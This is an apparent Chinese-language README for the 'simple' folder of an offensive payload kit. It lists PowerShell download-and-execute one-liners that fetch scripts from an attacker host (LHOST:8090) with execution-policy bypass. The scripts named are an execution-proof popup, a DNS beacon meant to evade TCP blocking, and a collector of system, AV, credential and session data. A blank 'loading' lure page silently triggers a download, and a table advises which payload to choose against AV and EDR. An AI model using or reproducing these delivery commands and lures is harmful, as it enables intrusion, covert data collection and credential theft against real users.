# simple/ —— 轻量触发与"空窗"载荷

用于**验证执行链是否真的通**，以及在不确定目标环境时找最小可行的落地动作。
全部为"一击即知结果"的轻量件，不做破坏性操作。

| 文件 | 用途 | 一行命令 | 预期结果 |
|---|---|---|---|
| `proof_msgbox.ps1` | 执行证明（弹窗 + 落标记） | `powershell -nop -ep bypass -c "iex(iwr http://LHOST:8090/delivery/simple/proof_msgbox.ps1 -UseBasicParsing)"` | 目标桌面弹窗、`%TEMP%` 出现 `.proof_*.txt` |
| `beacon_dns.ps1` | 出网证明（仅 DNS，绕 TCP 封禁） | `powershell -nop -ep bypass -c "iex(iwr http://LHOST:8090/delivery/simple/beacon_dns.ps1 -UseBasicParsing)"` | 我侧 DNS 日志出现 `<主机>-<用户>-1.beacon.test` |
| `quick_collect.ps1` | 一屏情报（系统/补丁/AV/邻居/凭据/会话） | `powershell -nop -ep bypass -c "iex(iwr http://LHOST:8090/delivery/simple/quick_collect.ps1 -UseBasicParsing)"` | 控制台一屏关键字段 |
| `blank_loading.html` | 空白加载窗诱导（3 秒后静默触发下载） | 浏览器打开该页 | 用户只看到"正在加载"，我方日志出现两次 GET |
| `one_liners.txt` | 12 条常用单行（点开即用） | — | — |

## 轻量触发的选择逻辑

| 目标环境 | 首选 | 原因 |
|---|---|---|
| 有 AV / 有 EDR | `beacon_dns.ps1` | 只做 DNS 解析，无文件、无进程创建、无网络连接 |
| 桌面会话可见 | `proof_msgbox.ps1` | 弹窗证明最直观，且几乎不被拦（纯 .NET UI） |
| 不确定能不能出网 | `beacon_dns.ps1` → 有日志即证明出网 | DNS 通常不受出站策略限制 |
| 只有浏览器交互 | `blank_loading.html` | 不需要用户点任何按钮 |
| 执行链刚通、要先看值不值得 | `quick_collect.ps1` | 一屏出全部关键判断字段 |

## 注意

- 这些载荷**不改系统配置**，无需回滚；`%TEMP%` 的 `.proof_*.txt` 记得清。
- `beacon_dns.ps1` 的域名要在我侧解析器被记录：dnsmasq 开 `log-queries` 或自研 UDP:53 记录器。
- `blank_loading.html` 里的 `__DLURL__` 需替换成实际直链。
